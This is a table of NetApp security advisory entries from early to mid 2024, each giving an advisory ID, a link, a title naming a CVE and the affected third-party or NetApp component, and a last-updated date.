| [**NTAP-20240524-0011**](https://security.netapp.com/advisory/ntap-20240524-0011/) | CVE-2024-33599 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240524-0013**](https://security.netapp.com/advisory/ntap-20240524-0013/) | CVE-2024-33600 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-24 |
| [**NTAP-20240524-0014**](https://security.netapp.com/advisory/ntap-20240524-0014/) | CVE-2024-33601 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-24 |
| [**NTAP-20240524-0012**](https://security.netapp.com/advisory/ntap-20240524-0012/) | CVE-2024-33602 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-24 |
| [**NTAP-20240517-0004**](https://security.netapp.com/advisory/ntap-20240517-0004/) | April 2024 IBM DB2 10.5, 11.1, and 11.5 Vulnerabilities in NetApp Products | 2024-05-17 |
| [**NTAP-20240517-0003**](https://security.netapp.com/advisory/ntap-20240517-0003/) | April 2024 IBM DB2 11.5 Vulnerabilities in NetApp Products | 2024-05-17 |
| [**NTAP-20240517-0007**](https://security.netapp.com/advisory/ntap-20240517-0007/) | CVE-2024-22017 Node.js Vulnerability in NetApp Products | 2024-08-23 |
| [**NTAP-20240517-0008**](https://security.netapp.com/advisory/ntap-20240517-0008/) | CVE-2024-22025 Node.js Vulnerability in NetApp Products | 2024-08-23 |
| [**NTAP-20240517-0010**](https://security.netapp.com/advisory/ntap-20240517-0010/) | CVE-2024-23450 Elasticsearch Vulnerability in NetApp Products | 2024-08-01 |
| [**NTAP-20240517-0002**](https://security.netapp.com/advisory/ntap-20240517-0002/) | CVE-2024-24786 Golang Vulnerability in NetApp Products | 2024-05-17 |
| [**NTAP-20240517-0009**](https://security.netapp.com/advisory/ntap-20240517-0009/) | CVE-2024-2494 Libvirt Vulnerability in NetApp Products | 2024-05-17 |
| [**NTAP-20240517-0006**](https://security.netapp.com/advisory/ntap-20240517-0006/) | CVE-2024-25030 IBM Db2 Vulnerability in NetApp Products | 2024-05-17 |
| [**NTAP-20240517-0005**](https://security.netapp.com/advisory/ntap-20240517-0005/) | CVE-2024-25046 IBM Db2 Vulnerability in NetApp Products | 2024-05-17 |
| [**NTAP-20240517-0001**](https://security.netapp.com/advisory/ntap-20240517-0001/) | CVE-2024-28752 Apache CXF Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240510-0001**](https://security.netapp.com/advisory/ntap-20240510-0001/) | CVE-2023-29483 Dnspython Vulnerability in NetApp Products | 2024-05-17 |
| [**NTAP-20240510-0009**](https://security.netapp.com/advisory/ntap-20240510-0009/) | CVE-2024-1874 PHP Vulnerability in NetApp Products | 2024-05-15 |
| [**NTAP-20240510-0012**](https://security.netapp.com/advisory/ntap-20240510-0012/) | CVE-2024-24474 QEMU Vulnerability in NetApp Products | 2024-05-10 |
| [**NTAP-20240510-0005**](https://security.netapp.com/advisory/ntap-20240510-0005/) | CVE-2024-25126 Rack Vulnerability in NetApp Products | 2024-05-10 |
| [**NTAP-20240510-0003**](https://security.netapp.com/advisory/ntap-20240510-0003/) | CVE-2024-25941 FreeBSD Vulnerability in NetApp Products | 2024-05-10 |
| [**NTAP-20240510-0007**](https://security.netapp.com/advisory/ntap-20240510-0007/) | CVE-2024-26141 Rack Vulnerability in NetApp Products | 2024-05-10 |
| [**NTAP-20240510-0004**](https://security.netapp.com/advisory/ntap-20240510-0004/) | CVE-2024-26143 Ruby on Rails Vulnerability in NetApp Products | 2024-05-10 |
| [**NTAP-20240510-0013**](https://security.netapp.com/advisory/ntap-20240510-0013/) | CVE-2024-26144 Ruby on Rails Vulnerability in NetApp Products | 2024-05-10 |
| [**NTAP-20240510-0006**](https://security.netapp.com/advisory/ntap-20240510-0006/) | CVE-2024-26146 Rack Vulnerability in NetApp Products | 2024-05-10 |
| [**NTAP-20240510-0008**](https://security.netapp.com/advisory/ntap-20240510-0008/) | CVE-2024-2756 PHP Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240510-0011**](https://security.netapp.com/advisory/ntap-20240510-0011/) | CVE-2024-2757 PHP Vulnerability in NetApp Products | 2024-05-10 |
| [**NTAP-20240510-0002**](https://security.netapp.com/advisory/ntap-20240510-0002/) | CVE-2024-27983 Node.js Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240510-0010**](https://security.netapp.com/advisory/ntap-20240510-0010/) | CVE-2024-3096 PHP Vulnerability in NetApp Products | 2024-05-15 |
| [**NTAP-20240503-0001**](https://security.netapp.com/advisory/ntap-20240503-0001/) | CVE-2023-3010 Grafana Vulnerability in NetApp Products | 2024-05-03 |
| [**NTAP-20240503-0002**](https://security.netapp.com/advisory/ntap-20240503-0002/) | CVE-2023-5122 Grafana Vulnerability in NetApp Products | 2024-05-03 |
| [**NTAP-20240503-0007**](https://security.netapp.com/advisory/ntap-20240503-0007/) | CVE-2023-5123 Grafana Vulnerability in NetApp Products | 2024-05-03 |
| [**NTAP-20240503-0006**](https://security.netapp.com/advisory/ntap-20240503-0006/) | CVE-2023-5517 ISC BIND Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240503-0005**](https://security.netapp.com/advisory/ntap-20240503-0005/) | CVE-2023-5680 ISC BIND Vulnerability in NetApp Products | 2024-07-19 |
| [**NTAP-20240503-0011**](https://security.netapp.com/advisory/ntap-20240503-0011/) | CVE-2023-6129 MySQL Enterprise Backup Vulnerability in NetApp Products | 2024-05-08 |
| [**NTAP-20240503-0008**](https://security.netapp.com/advisory/ntap-20240503-0008/) | CVE-2023-6516 ISC BIND Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20240503-0012**](https://security.netapp.com/advisory/ntap-20240503-0012/) | CVE-2024-0853 MySQL Enterprise Backup Vulnerability in NetApp Products | 2024-05-08 |
| [**NTAP-20240503-0004**](https://security.netapp.com/advisory/ntap-20240503-0004/) | CVE-2024-21885 X.Org X Vulnerability in NetApp Products | 2024-06-10 |
| [**NTAP-20240503-0009**](https://security.netapp.com/advisory/ntap-20240503-0009/) | CVE-2024-2398 curl Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20240503-0010**](https://security.netapp.com/advisory/ntap-20240503-0010/) | CVE-2024-2466 curl Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240503-0013**](https://security.netapp.com/advisory/ntap-20240503-0013/) | CVE-2024-2511 OpenSSL Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240503-0003**](https://security.netapp.com/advisory/ntap-20240503-0003/) | CVE-2024-26142 Ruby on Rails Vulnerability in NetApp Products | 2024-05-03 |
| [**NTAP-20240426-0004**](https://security.netapp.com/advisory/ntap-20240426-0004/) | April 2024 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20240426-0015**](https://security.netapp.com/advisory/ntap-20240426-0015/) | April 2024 MySQL Cluster Vulnerabilities in NetApp Products | 2024-09-12 |
| [**NTAP-20240426-0012**](https://security.netapp.com/advisory/ntap-20240426-0012/) | April 2024 MySQL Server 8.0.34 Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20240426-0014**](https://security.netapp.com/advisory/ntap-20240426-0014/) | April 2024 MySQL Server 8.0.35 and 8.2.0 Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20240426-0011**](https://security.netapp.com/advisory/ntap-20240426-0011/) | April 2024 MySQL Server 8.0.35 Vulnerabilities in NetApp Products | 2024-12-06 |
| [**NTAP-20240426-0013**](https://security.netapp.com/advisory/ntap-20240426-0013/) | April 2024 MySQL Server 8.0.36 and 8.3.0 Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20240426-0005**](https://security.netapp.com/advisory/ntap-20240426-0005/) | CVE-2023-32643 Gnome Glib Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20240426-0006**](https://security.netapp.com/advisory/ntap-20240426-0006/) | CVE-2023-32665 Gnome Glib Vulnerability in NetApp Products | 2024-09-05 |
| [**NTAP-20240426-0001**](https://security.netapp.com/advisory/ntap-20240426-0001/) | CVE-2023-4408 ISC BIND Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240426-0007**](https://security.netapp.com/advisory/ntap-20240426-0007/) | CVE-2023-44487 MySQL Cluster Vulnerability in NetApp Products | 2024-08-07 |
| [**NTAP-20240426-0002**](https://security.netapp.com/advisory/ntap-20240426-0002/) | CVE-2023-5679 ISC BIND Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240426-0008**](https://security.netapp.com/advisory/ntap-20240426-0008/) | CVE-2023-6129 MySQL Connector/ODBC Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240426-0009**](https://security.netapp.com/advisory/ntap-20240426-0009/) | CVE-2024-0853 MySQL Cluster Vulnerability in NetApp Products | 2024-09-12 |
| [**NTAP-20240426-0010**](https://security.netapp.com/advisory/ntap-20240426-0010/) | CVE-2024-21015 MySQL Server Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240426-0003**](https://security.netapp.com/advisory/ntap-20240426-0003/) | CVE-2024-2312 Grub2 Vulnerability in NetApp Products | 2024-05-24 |
| [**NTAP-20240419-0003**](https://security.netapp.com/advisory/ntap-20240419-0003/) | CVE-2022-23084 FreeBSD Vulnerability in NetApp Products | 2024-04-19 |
| [**NTAP-20240419-0002**](https://security.netapp.com/advisory/ntap-20240419-0002/) | CVE-2022-23086 FreeBSD Vulnerability in NetApp Products | 2024-04-19 |
| [**NTAP-20240419-0009**](https://security.netapp.com/advisory/ntap-20240419-0009/) | CVE-2023-45288 Golang Vulnerability in NetApp Products | 2024-08-07 |
| [**NTAP-20240419-0001**](https://security.netapp.com/advisory/ntap-20240419-0001/) | CVE-2023-51780 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240419-0008**](https://security.netapp.com/advisory/ntap-20240419-0008/) | CVE-2024-1597 PostgreSQL Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240419-0005**](https://security.netapp.com/advisory/ntap-20240419-0005/) | CVE-2024-22257 Spring Security Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240419-0006**](https://security.netapp.com/advisory/ntap-20240419-0006/) | CVE-2024-24750 Node.js Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240419-0007**](https://security.netapp.com/advisory/ntap-20240419-0007/) | CVE-2024-24758 Node.js Vulnerability in NetApp Products | 2024-08-23 |
| [**NTAP-20240419-0004**](https://security.netapp.com/advisory/ntap-20240419-0004/) | CVE-2024-25940 FreeBSD Vulnerability in NetApp Products | 2024-04-19 |
| [**NTAP-20240419-0010**](https://security.netapp.com/advisory/ntap-20240419-0010/) | February 2024 QEMU Vulnerabilities in NetApp Products | 2024-04-19 |
| [**NTAP-20240415-0013**](https://security.netapp.com/advisory/ntap-20240415-0013/) | April 2024 Apache HTTP Server Vulnerabilities in NetApp Products | 2024-12-13 |
| [**NTAP-20240415-0005**](https://security.netapp.com/advisory/ntap-20240415-0005/) | CVE-2022-23087 FreeBSD Vulnerability in NetApp Products | 2024-04-15 |
| [**NTAP-20240415-0006**](https://security.netapp.com/advisory/ntap-20240415-0006/) | CVE-2022-23089 FreeBSD Vulnerability in NetApp Products | 2024-04-15 |
| [**NTAP-20240415-0007**](https://security.netapp.com/advisory/ntap-20240415-0007/) | CVE-2022-23090 FreeBSD Vulnerability in NetApp Products | 2024-04-15 |
| [**NTAP-20240415-0008**](https://security.netapp.com/advisory/ntap-20240415-0008/) | CVE-2022-23091 FreeBSD Vulnerability in NetApp Products | 2024-04-15 |
| [**NTAP-20240415-0009**](https://security.netapp.com/advisory/ntap-20240415-0009/) | CVE-2022-23092 FreeBSD Vulnerability in NetApp Products | 2024-04-15 |
| [**NTAP-20240415-0004**](https://security.netapp.com/advisory/ntap-20240415-0004/) | CVE-2022-4289 GitLab Vulnerability in NetApp Products | 2024-04-15 |
| [**NTAP-20240415-0002**](https://security.netapp.com/advisory/ntap-20240415-0002/) | CVE-2023-6356 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240415-0003**](https://security.netapp.com/advisory/ntap-20240415-0003/) | CVE-2023-6535 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240415-0001**](https://security.netapp.com/advisory/ntap-20240415-0001/) | CVE-2023-6536 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240415-0010**](https://security.netapp.com/advisory/ntap-20240415-0010/) | CVE-2024-26458 MIT Kerberos 5 Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240415-0011**](https://security.netapp.com/advisory/ntap-20240415-0011/) | CVE-2024-26461 MIT Kerberos 5 Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240415-0012**](https://security.netapp.com/advisory/ntap-20240415-0012/) | CVE-2024-26462 MIT Kerberos 5 Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240411-0001**](https://security.netapp.com/advisory/ntap-20240411-0001/) | CVE-2024-21989 Privilege Escalation Vulnerability in ONTAP Select Deploy administration utility | 2024-04-11 |
| [**NTAP-20240411-0002**](https://security.netapp.com/advisory/ntap-20240411-0002/) | CVE-2024-21990 Default Privileged Account Credentials Vulnerability in ONTAP Select Deploy administration utility | 2024-04-11 |
| [**NTAP-20240405-0001**](https://security.netapp.com/advisory/ntap-20240405-0001/) | CVE-2022-34357 IBM Cognos Analytics Mobile Server Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240405-0006**](https://security.netapp.com/advisory/ntap-20240405-0006/) | CVE-2023-22655 Intel Xeon Processors Vulnerability in NetApp Products | 2024-04-11 |
| [**NTAP-20240405-0004**](https://security.netapp.com/advisory/ntap-20240405-0004/) | CVE-2023-30996 IBM Cognos Analytics Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240405-0002**](https://security.netapp.com/advisory/ntap-20240405-0002/) | CVE-2023-32344 IBM Cognos Analytics Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240405-0010**](https://security.netapp.com/advisory/ntap-20240405-0010/) | CVE-2023-32666 Intel Xeon Processors Vulnerability in NetApp Products | 2024-04-11 |
| [**NTAP-20240405-0005**](https://security.netapp.com/advisory/ntap-20240405-0005/) | CVE-2023-35191 Intel SPS Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20240405-0003**](https://security.netapp.com/advisory/ntap-20240405-0003/) | CVE-2023-38359 IBM Cognos Analytics Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240405-0008**](https://security.netapp.com/advisory/ntap-20240405-0008/) | CVE-2023-38575 Intel Processors Vulnerability in NetApp Products | 2024-04-11 |
| [**NTAP-20240405-0007**](https://security.netapp.com/advisory/ntap-20240405-0007/) | CVE-2023-39368 Intel Processors Vulnerability in NetApp Products | 2024-04-11 |
| [**NTAP-20240405-0009**](https://security.netapp.com/advisory/ntap-20240405-0009/) | CVE-2023-43490 Intel Xeon D Processors Vulnerability in NetApp Products | 2024-04-15 |
| [**NTAP-20240402-0001**](https://security.netapp.com/advisory/ntap-20240402-0001/) | CVE-2024-3094 XZ Utils Vulnerability in NetApp Products | 2024-06-03 |
| [**NTAP-20240402-0002**](https://security.netapp.com/advisory/ntap-20240402-0002/) | March 2024 Apache Tomcat Vulnerabilities in NetApp Products | 2024-12-13 |
| [**NTAP-20240329-0003**](https://security.netapp.com/advisory/ntap-20240329-0003/) | CVE-2022-41946 PostgreSQL Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240329-0006**](https://security.netapp.com/advisory/ntap-20240329-0006/) | CVE-2023-45289 Golang Vulnerability in NetApp Products | 2024-07-11 |
| [**NTAP-20240329-0004**](https://security.netapp.com/advisory/ntap-20240329-0004/) | CVE-2023-45290 Golang Vulnerability in NetApp Products | 2024-04-15 |
| [**NTAP-20240329-0002**](https://security.netapp.com/advisory/ntap-20240329-0002/) | CVE-2024-21896 Node.js Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240329-0001**](https://security.netapp.com/advisory/ntap-20240329-0001/) | CVE-2024-22201 Eclipse Jetty Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240329-0005**](https://security.netapp.com/advisory/ntap-20240329-0005/) | CVE-2024-24783 Golang Vulnerability in NetApp Products | 2024-08-08 |
| [**NTAP-20240329-0007**](https://security.netapp.com/advisory/ntap-20240329-0007/) | CVE-2024-24784 Golang Vulnerability in NetApp Products | 2024-04-15 |
| [**NTAP-20240329-0008**](https://security.netapp.com/advisory/ntap-20240329-0008/) | CVE-2024-24785 Golang Vulnerability in NetApp Products | 2024-05-08 |
| [**NTAP-20240322-0004**](https://security.netapp.com/advisory/ntap-20240322-0004/) | CVE-2022-23085 FreeBSD Vulnerability in NetApp Products | 2024-04-05 |
| [**NTAP-20240322-0005**](https://security.netapp.com/advisory/ntap-20240322-0005/) | CVE-2023-29153 Intel SPS Vulnerability in NetApp Products | 2024-09-05 |
| [**NTAP-20240322-0008**](https://security.netapp.com/advisory/ntap-20240322-0008/) | CVE-2023-43051 IBM Cognos Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240322-0002**](https://security.netapp.com/advisory/ntap-20240322-0002/) | CVE-2023-6660 FreeBSD Vulnerability in NetApp Products | 2024-04-05 |
| [**NTAP-20240322-0007**](https://security.netapp.com/advisory/ntap-20240322-0007/) | CVE-2024-1635 Undertow Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240322-0003**](https://security.netapp.com/advisory/ntap-20240322-0003/) | CVE-2024-21892 Node.js Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240322-0006**](https://security.netapp.com/advisory/ntap-20240322-0006/) | CVE-2024-25617 Squid Vulnerability in NetApp Products | 2024-04-15 |
| [**NTAP-20240322-0001**](https://security.netapp.com/advisory/ntap-20240322-0001/) | CVE-2024-28757 libexpat Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240315-0001**](https://security.netapp.com/advisory/ntap-20240315-0001/) | CVE-2022-25147 Apache Portable Runtime (APR) Vulnerability in NetApp Products | 2024-05-15 |
| [**NTAP-20240315-0008**](https://security.netapp.com/advisory/ntap-20240315-0008/) | CVE-2023-42282 NPM Vulnerability in NetApp Products | 2024-05-08 |
| [**NTAP-20240315-0006**](https://security.netapp.com/advisory/ntap-20240315-0006/) | CVE-2023-45918 GNU Ncurses Vulnerability in NetApp Products | 2024-10-03 |
| [**NTAP-20240315-0007**](https://security.netapp.com/advisory/ntap-20240315-0007/) | CVE-2024-0232 SQLite Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240315-0002**](https://security.netapp.com/advisory/ntap-20240315-0002/) | CVE-2024-21890 Node.js Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240315-0005**](https://security.netapp.com/advisory/ntap-20240315-0005/) | CVE-2024-21891 Node.js Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240315-0004**](https://security.netapp.com/advisory/ntap-20240315-0004/) | CVE-2024-22019 Node.js Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240315-0003**](https://security.netapp.com/advisory/ntap-20240315-0003/) | CVE-2024-22234 Spring Security Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240315-0010**](https://security.netapp.com/advisory/ntap-20240315-0010/) | SnakeYAML 1.31 Vulnerabilities in NetApp Products | 2024-06-03 |
| [**NTAP-20240315-0009**](https://security.netapp.com/advisory/ntap-20240315-0009/) | SnakeYAML 1.32 Vulnerabilities in NetApp Products | 2024-06-03 |
| [**NTAP-20240307-0013**](https://security.netapp.com/advisory/ntap-20240307-0013/) | CVE-2022-4886 Ingress nginx Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20240307-0007**](https://security.netapp.com/advisory/ntap-20240307-0007/) | CVE-2023-50387 ISC BIND Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240307-0008**](https://security.netapp.com/advisory/ntap-20240307-0008/) | CVE-2023-50868 ISC BIND Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240307-0005**](https://security.netapp.com/advisory/ntap-20240307-0005/) | CVE-2023-52426 libexpat Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240307-0004**](https://security.netapp.com/advisory/ntap-20240307-0004/) | CVE-2024-0853 curl Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20240307-0010**](https://security.netapp.com/advisory/ntap-20240307-0010/) | CVE-2024-25710 Apache Commons Compress Vulnerability in NetApp Products | 2024-07-11 |
| [**NTAP-20240307-0009**](https://security.netapp.com/advisory/ntap-20240307-0009/) | CVE-2024-26308 Apache Commons Compress Vulnerability in NetApp Products | 2024-07-11 |
| [**NTAP-20240307-0002**](https://security.netapp.com/advisory/ntap-20240307-0002/) | January 2024 IBM DB2 10.1, 10.5, 11.1 Vulnerabilities in NetApp Products | 2024-03-07 |
| [**NTAP-20240307-0003**](https://security.netapp.com/advisory/ntap-20240307-0003/) | January 2024 IBM DB2 10.5, 11.1, 11.5 Vulnerabilities in NetApp Products | 2024-03-07 |
| [**NTAP-20240307-0001**](https://security.netapp.com/advisory/ntap-20240307-0001/) | January 2024 IBM DB2 11.5 Vulnerabilities in NetApp Products | 2024-03-07 |
| [**NTAP-20240307-0011**](https://security.netapp.com/advisory/ntap-20240307-0011/) | January 2024 Tianocore EDK2 Vulnerabilities in NetApp Products | 2024-03-07 |
| [**NTAP-20240307-0006**](https://security.netapp.com/advisory/ntap-20240307-0006/) | January 2024 X.Org X Server 21.1.11 Vulnerabilities in NetApp Products | 2024-05-08 |
| [**NTAP-20240307-0012**](https://security.netapp.com/advisory/ntap-20240307-0012/) | October 2023 Ingress nginx Vulnerabilities in NetApp Products | 2024-03-07 |
| [**NTAP-20240229-0005**](https://security.netapp.com/advisory/ntap-20240229-0005/) | CVE-2022-43937 Brocade SANnav Information Disclosure Vulnerability | 2024-02-29 |
| [**NTAP-20240229-0002**](https://security.netapp.com/advisory/ntap-20240229-0002/) | CVE-2023-2861 QEMU Vulnerability in NetApp Products | 2024-02-29 |
| [**NTAP-20240229-0003**](https://security.netapp.com/advisory/ntap-20240229-0003/) | CVE-2023-31423 Brocade SANnav Information Disclosure Vulnerability | 2024-02-29 |
| [**NTAP-20240229-0004**](https://security.netapp.com/advisory/ntap-20240229-0004/) | CVE-2023-31424 Brocade SANnav Authentication Bypass Vulnerability | 2024-02-29 |
| [**NTAP-20240229-0001**](https://security.netapp.com/advisory/ntap-20240229-0001/) | CVE-2023-46672 Logstash Vulnerability in NetApp Products | 2024-02-29 |
| [**NTAP-20240223-0003**](https://security.netapp.com/advisory/ntap-20240223-0003/) | CVE-2023-41056 Redis Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20240223-0004**](https://security.netapp.com/advisory/ntap-20240223-0004/) | CVE-2023-6004 libssh Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20240223-0001**](https://security.netapp.com/advisory/ntap-20240223-0001/) | CVE-2023-6683 QEMU Vulnerability in NetApp Products | 2024-02-23 |
| [**NTAP-20240223-0006**](https://security.netapp.com/advisory/ntap-20240223-0006/) | CVE-2023-6779 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240223-0002**](https://security.netapp.com/advisory/ntap-20240223-0002/) | CVE-2024-0565 Linux Kernel Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20240223-0005**](https://security.netapp.com/advisory/ntap-20240223-0005/) | CVE-2024-0831 HashiCorp Vault Vulnerability in NetApp Products | 2024-02-23 |
| [**NTAP-20240223-0007**](https://security.netapp.com/advisory/ntap-20240223-0007/) | CVE-2024-1048 Grub2 Vulnerability in NetApp Products | 2024-05-24 |
| [**NTAP-20240223-0008**](https://security.netapp.com/advisory/ntap-20240223-0008/) | CVE-2024-22667 Vim Vulnerability in NetApp Products | 2024-09-26 |
| [**NTAP-20240216-0010**](https://security.netapp.com/advisory/ntap-20240216-0010/) | CVE-2015-7501 Redhat JBoss Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20240216-0011**](https://security.netapp.com/advisory/ntap-20240216-0011/) | CVE-2020-1745 Undertow Vulnerability in NetApp Products | 2024-02-22 |
| [**NTAP-20240216-0004**](https://security.netapp.com/advisory/ntap-20240216-0004/) | CVE-2022-41678 Apache ActiveMQ Vulnerability in NetApp Products | 2024-07-11 |
| [**NTAP-20240216-0008**](https://security.netapp.com/advisory/ntap-20240216-0008/) | CVE-2022-45047 Apache MINA SSHD Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20240216-0006**](https://security.netapp.com/advisory/ntap-20240216-0006/) | CVE-2023-4001 Grub2 Vulnerability in NetApp Products | 2024-06-03 |
| [**NTAP-20240216-0003**](https://security.netapp.com/advisory/ntap-20240216-0003/) | CVE-2023-49238 Gradle Vulnerability in NetApp Products | 2024-05-08 |
| [**NTAP-20240216-0009**](https://security.netapp.com/advisory/ntap-20240216-0009/) | CVE-2023-6129 OpenSSL Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240216-0007**](https://security.netapp.com/advisory/ntap-20240216-0007/) | CVE-2023-6246 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240216-0005**](https://security.netapp.com/advisory/ntap-20240216-0005/) | CVE-2024-21733 Apache Tomcat Vulnerability in NetApp Products | 2024-07-01 |
| [**NTAP-20240216-0012**](https://security.netapp.com/advisory/ntap-20240216-0012/) | CVE-2024-21983 Denial of Service Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2024-03-22 |
| [**NTAP-20240216-0013**](https://security.netapp.com/advisory/ntap-20240216-0013/) | CVE-2024-21984 Reflected Cross-Site Scripting Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2024-03-22 |
| [**NTAP-20240216-0001**](https://security.netapp.com/advisory/ntap-20240216-0001/) | CVE-2024-21987 Improper Authorization Vulnerability in SnapCenter | 2024-02-16 |
| [**NTAP-20240216-0002**](https://security.netapp.com/advisory/ntap-20240216-0002/) | CVE-2024-22207 Node.js Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240208-0009**](https://security.netapp.com/advisory/ntap-20240208-0009/) | CVE-2014-125087 java-xmlbuilder Vulnerability in NetApp Products | 2024-05-17 |
| [**NTAP-20240208-0003**](https://security.netapp.com/advisory/ntap-20240208-0003/) | CVE-2021-44528 Ruby on Rails Vulnerability in NetApp Products | 2024-02-08 |
| [**NTAP-20240208-0002**](https://security.netapp.com/advisory/ntap-20240208-0002/) | CVE-2023-42465 Sudo Vulnerability in NetApp Products | 2024-06-10 |
| [**NTAP-20240208-0005**](https://security.netapp.com/advisory/ntap-20240208-0005/) | CVE-2023-47039 Perl Vulnerability in NetApp Products | 2024-09-26 |
| [**NTAP-20240208-0004**](https://security.netapp.com/advisory/ntap-20240208-0004/) | CVE-2023-6693 QEMU Vulnerability in NetApp Products | 2024-02-08 |
| [**NTAP-20240208-0001**](https://security.netapp.com/advisory/ntap-20240208-0001/) | CVE-2023-7090 Sudo Vulnerability in NetApp Products | 2024-09-26 |
| [**NTAP-20240208-0007**](https://security.netapp.com/advisory/ntap-20240208-0007/) | CVE-2024-0057 .NET Vulnerability in NetApp Products | 2024-06-03 |
| [**NTAP-20240208-0006**](https://security.netapp.com/advisory/ntap-20240208-0006/) | CVE-2024-0727 OpenSSL Vulnerability in NetApp Products | 2024-11-29 |
| [**NTAP-20240208-0008**](https://security.netapp.com/advisory/ntap-20240208-0008/) | CVE-2024-21312 .NET Framework Vulnerability in NetApp Products | 2024-06-21 |
| [**NTAP-20240208-0010**](https://security.netapp.com/advisory/ntap-20240208-0010/) | CVE-2024-23638 Squid Vulnerability in NetApp Products | 2024-03-21 |
| [**NTAP-20240202-0005**](https://security.netapp.com/advisory/ntap-20240202-0005/) | CVE-2021-22942 Ruby on Rails Vulnerability in NetApp Products | 2024-02-06 |
| [**NTAP-20240202-0004**](https://security.netapp.com/advisory/ntap-20240202-0004/) | CVE-2023-2002 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240202-0007**](https://security.netapp.com/advisory/ntap-20240202-0007/) | CVE-2023-22792 Ruby on Rails Vulnerability in NetApp Products | 2024-02-06 |
| [**NTAP-20240202-0008**](https://security.netapp.com/advisory/ntap-20240202-0008/) | CVE-2023-22794 Ruby on Rails Vulnerability in NetApp Products | 2024-02-06 |
| [**NTAP-20240202-0010**](https://security.netapp.com/advisory/ntap-20240202-0010/) | CVE-2023-22795 Ruby on Rails Vulnerability in NetApp Products | 2024-02-06 |
| [**NTAP-20240202-0009**](https://security.netapp.com/advisory/ntap-20240202-0009/) | CVE-2023-22796 Ruby on Rails Vulnerability in NetApp Products | 2024-02-06 |
| [**NTAP-20240202-0012**](https://security.netapp.com/advisory/ntap-20240202-0012/) | CVE-2023-27318 Denial of Service Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2024-02-02 |
| [**NTAP-20240202-0006**](https://security.netapp.com/advisory/ntap-20240202-0006/) | CVE-2023-28120 Ruby on Rails Vulnerability in NetApp Products | 2024-02-06 |
| [**NTAP-20240202-0001**](https://security.netapp.com/advisory/ntap-20240202-0001/) | CVE-2023-34319 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240202-0003**](https://security.netapp.com/advisory/ntap-20240202-0003/) | CVE-2023-3776 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240202-0002**](https://security.netapp.com/advisory/ntap-20240202-0002/) | CVE-2023-3863 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
